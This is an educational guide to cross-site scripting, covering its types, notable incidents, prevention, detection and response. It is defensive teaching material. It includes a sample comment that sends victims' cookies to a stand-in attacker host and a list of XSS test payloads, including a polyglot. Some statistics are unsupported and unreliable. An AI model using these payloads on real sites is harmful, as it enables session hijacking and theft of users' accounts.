# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) is a type of security vulnerability found in web applications that allows attackers to inject malicious client-side scripts into web pages viewed by other users. When these scripts execute in victims' browsers, they can steal data, hijack sessions, deface websites, or redirect users to malicious sites. XSS is one of the most common web application vulnerabilities.

## What Is It?

XSS attacks involve:
- Injecting malicious JavaScript or other client-side code into web pages
- Executing code in victims' browsers within the context of the trusted site
- Stealing cookies, session tokens, and sensitive data
- Manipulating page content and behavior
- Redirecting users to malicious websites
- Keylogging and form hijacking

The term "Cross-Site" refers to the fact that the attack crosses the trust boundary between the website and the user's browser, exploiting the browser's trust in the website.

## How It Works

### The Attack Process

1. **Vulnerability Discovery**:
   - Attacker identifies input fields that display user data
   - Tests with special characters and script tags
   - Finds locations where input isn't properly sanitized
   - Common targets: search boxes, comment sections, user profiles

2. **Payload Crafting**:
   - Creates malicious JavaScript code
   - Designs code to achieve specific goal (steal cookies, redirect, etc.)
   - May obfuscate code to evade filters

3. **Injection**:
   - Injects payload into vulnerable input field
   - Payload may be stored (persistent) or reflected (non-persistent)
   - Code becomes part of the webpage

4. **Execution**:
   - Victim views the page containing malicious code
   - Browser executes script, believing it's from the trusted site
   - Script runs with same permissions as legitimate site code

5. **Exploitation**:
   - Steal session cookies and hijack accounts
   - Capture keystrokes and form data
   - Redirect to phishing sites
   - Deface website content
   - Spread malware

### Types of XSS

1. **Stored XSS (Persistent)**:
   - Malicious script stored on target server (database, file, etc.)
   - Executed whenever victims view the affected page
   - Most dangerous type
   - Common in: comment sections, forums, user profiles

**Example**:
```javascript
// Attacker posts comment:
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

// Every user who views this comment has their cookies stolen
```

2. **Reflected XSS (Non-Persistent)**:
   - Malicious script reflected off web server (in error message, search result)
   - Not stored on server
   - Requires victim to click malicious link
   - Common in: search results, error messages

**Example**:
```
// Malicious URL:
http://example.com/search?q=<script>alert(document.cookie)</script>

// Script executes when victim clicks link
```

3. **DOM-Based XSS**:
   - Vulnerability in client-side JavaScript
   - Payload never sent to server
   - Entirely client-side attack
   - Manipulates Document Object Model (DOM)

**Example**:
```javascript
// Vulnerable code:
document.write("Hello " + location.hash.substring(1));

// Malicious URL:
http://example.com/#<script>alert('XSS')</script>
```

4. **Blind XSS**:
   - Stored XSS where attacker can't see the vulnerable page
   - Payload triggers on admin panel or internal system
   - Difficult to detect
   - Used for internal reconnaissance

## Real-World Examples

### Notable Incidents

1. **Samy Worm (MySpace, 2005)**:
   - First major XSS worm
   - Creator Samy Kamkar exploited MySpace XSS vulnerability
   - Self-propagating script added "Samy is my hero" to profiles
   - Infected over 1 million users in 20 hours
   - Led to first felony conviction for XSS

2. **TweetDeck (2014)**:
   - XSS vulnerability in Twitter's TweetDeck
   - Self-retweeting XSS payload
   - Spread rapidly across Twitter
   - Forced Twitter to temporarily shut down TweetDeck

3. **British Airways (2018)**:
   - Magecart XSS attack on payment page
   - 380,000 payment cards compromised
   - £20 million fine by UK ICO
   - Attackers modified 22 lines of code

4. **eBay (2014)**:
   - Multiple XSS vulnerabilities discovered
   - Allowed attackers to steal user credentials
   - Phishing attacks launched through eBay pages
   - Affected millions of users

5. **PayPal (Multiple instances)**:
   - Various XSS vulnerabilities discovered over years
   - Could lead to account takeover
   - Bug bounty payouts to researchers
   - Demonstrates even major sites vulnerable

6. **Apache Struts (2017)**:
   - While primarily known for Equifax breach
   - Had XSS vulnerabilities alongside other issues
   - Demonstrated importance of framework security

### Statistics

- XSS accounts for 40% of all cyberattacks
- 53% of web applications have XSS vulnerabilities
- OWASP ranks XSS in Top 10 Web Application Risks
- Average bug bounty for XSS: $500-$5,000
- Can lead to average breach cost of $3.9 million

## Prevention Methods

### Input Validation and Sanitization

1. **Whitelist Input Validation**:
   - Define allowed characters and patterns
   - Reject anything not explicitly allowed
   - Validate on server-side (never trust client-side)
   - Validate data type, length, format

2. **Input Sanitization**:
   - Remove or encode dangerous characters
   - Strip HTML tags when not needed
   - Use established sanitization libraries
   - Don't write your own sanitization functions

### Output Encoding

1. **Context-Aware Encoding**:
   - HTML Entity Encoding: `< becomes &lt;`
   - JavaScript Encoding: for data in JavaScript context
   - URL Encoding: for data in URLs
   - CSS Encoding: for data in CSS context

2. **Encoding Functions**:
   - Use framework-provided encoding functions
   - Never concatenate user input into output
   - Encode all dynamic content before rendering

**Example (PHP)**:
```php
// Vulnerable:
echo "<div>" . $_GET['name'] . "</div>";

// Secure:
echo "<div>" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</div>";
```

### Content Security Policy (CSP)

Implement CSP headers to restrict script execution:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none'
```

**Benefits**:
- Blocks inline scripts
- Restricts script sources
- Prevents eval() and similar functions
- Reports violations

### Framework-Specific Protections

1. **React**:
   - Auto-escapes content in JSX
   - Avoid dangerouslySetInnerHTML
   - Use libraries like DOMPurify for HTML content

2. **Angular**:
   - Built-in sanitization
   - Trusts only marked content
   - Context-aware encoding

3. **Vue.js**:
   - Automatic escaping in templates
   - Avoid v-html with user input
   - Use v-text instead

### Additional Security Measures

1. **HTTPOnly Cookies**:
   - Prevents JavaScript access to cookies
   - Mitigates session hijacking
   - Set in cookie configuration

```
Set-Cookie: sessionid=abc123; HttpOnly; Secure
```

2. **X-XSS-Protection Header**:
   - Browser-level XSS filter
   - Legacy protection (browsers moving to CSP)

```
X-XSS-Protection: 1; mode=block
```

3. **Use Security Libraries**:
   - **DOMPurify**: HTML sanitization
   - **OWASP Java Encoder**: For Java applications
   - **bleach**: For Python
   - **Microsoft Anti-XSS Library**: For .NET

4. **Template Engines**:
   - Use modern template engines with auto-escaping
   - Handlebars, Mustache, Jinja2 (with autoescape)
   - Avoid eval() and innerHTML

## Detection Techniques

### Manual Testing

1. **Basic XSS Payloads**:
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')">
```

2. **Advanced Payloads**:
```javascript
// Event handlers
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

// DOM-based
#<img src=x onerror=alert('XSS')>

// Polyglot (multiple contexts)
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

### Automated Scanning

1. **Security Scanners**:
   - **Burp Suite**: Professional web security testing
   - **OWASP ZAP**: Free, open-source scanner
   - **Acunetix**: Commercial web vulnerability scanner
   - **Netsparker**: Automated security scanner
   - **Arachni**: Open-source web security scanner

2. **Browser Extensions**:
   - **XSS Me**: Firefox extension
   - **XSSer**: Automated XSS testing tool
   - **BeEF** (Browser Exploitation Framework): For XSS impact testing

3. **Code Analysis Tools**:
   - **Static Application Security Testing (SAST)**:
     - SonarQube
     - Checkmarx
     - Fortify
   - **Dynamic Application Security Testing (DAST)**:
     - OWASP ZAP
     - Burp Suite

### Log Monitoring

Monitor for suspicious patterns:
- Unusual characters in input fields (`<`, `>`, `script`, `onerror`)
- Multiple failed attempts with script tags
- Requests with JavaScript keywords
- Encoded payloads (URL encoding, Unicode, etc.)

### Browser Developer Tools

1. **Console Monitoring**:
   - Watch for unexpected script execution
   - Check for CSP violations
   - Monitor network requests

2. **DOM Inspection**:
   - Check for injected script elements
   - Look for modified attributes
   - Verify source of scripts

## Response Actions

### If XSS Vulnerability Is Discovered

1. **Immediate Actions**:
   - Remove or sanitize the malicious content
   - Block the attack vector
   - Notify security team
   - Assess impact and scope

2. **User Protection**:
   - Invalidate potentially compromised sessions
   - Force password resets if credentials may be compromised
   - Notify affected users
   - Monitor for suspicious account activity

3. **Code Remediation**:
   - Fix the vulnerable code
   - Implement proper input validation
   - Add output encoding
   - Deploy CSP if not present
   - Review similar code patterns

4. **Testing**:
   - Verify the fix works
   - Test for bypass attempts
   - Scan entire application for similar vulnerabilities
   - Penetration testing

### If Under Active XSS Attack

1. **Containment**:
   - Take affected pages offline if possible
   - Implement WAF rules to block attacks
   - Clear affected content from database
   - Rotate session tokens

2. **Investigation**:
   - Identify attack source
   - Determine what data was accessed
   - Check for other injected payloads
   - Preserve evidence

3. **Recovery**:
   - Clean database of malicious content
   - Deploy fixes
   - Restore from clean backup if necessary
   - Enhanced monitoring

## Best Practices Summary

✅ Validate and sanitize all user input
✅ Use context-aware output encoding
✅ Implement Content Security Policy (CSP)
✅ Set HTTPOnly and Secure flags on cookies
✅ Use modern frameworks with auto-escaping
✅ Never insert untrusted data directly into HTML
✅ Avoid inline JavaScript
✅ Use established security libraries (DOMPurify, etc.)
✅ Regular security testing and code reviews
✅ Keep frameworks and libraries updated
✅ Implement Web Application Firewall (WAF)
✅ Train developers on secure coding
✅ Use template engines with auto-escaping
✅ Encode data based on context (HTML, JavaScript, URL)
✅ Principle of least privilege for cookies and scripts

## Common Mistakes to Avoid

❌ Blacklist filtering (easily bypassed)
❌ Client-side only validation
❌ Using innerHTML with user data
❌ Trusting data from database without re-encoding
❌ Writing custom sanitization functions
❌ Allowing inline scripts with user data
❌ Disabling framework security features
❌ Not testing for DOM-based XSS
❌ Forgetting to encode URL parameters
❌ Using eval() or Function() with user input

## Testing Checklist

- [ ] All user inputs validated and sanitized
- [ ] Output properly encoded for context
- [ ] CSP header implemented and tested
- [ ] HTTPOnly cookies configured
- [ ] No inline JavaScript with user data
- [ ] Security headers configured
- [ ] Automated scanning performed
- [ ] Manual penetration testing completed
- [ ] Framework security features enabled
- [ ] Security libraries properly implemented

## Conclusion

Cross-Site Scripting remains one of the most prevalent web application vulnerabilities despite being well-documented and preventable. The key to defense is treating all user input as untrusted, implementing proper output encoding, and leveraging modern security features like CSP. While frameworks provide built-in protections, developers must understand how to use them correctly. Regular testing, security awareness, and defense-in-depth approaches are essential for preventing XSS attacks.

**Remember**: If you're putting user data into a web page, you must encode it properly. When in doubt, encode it again!
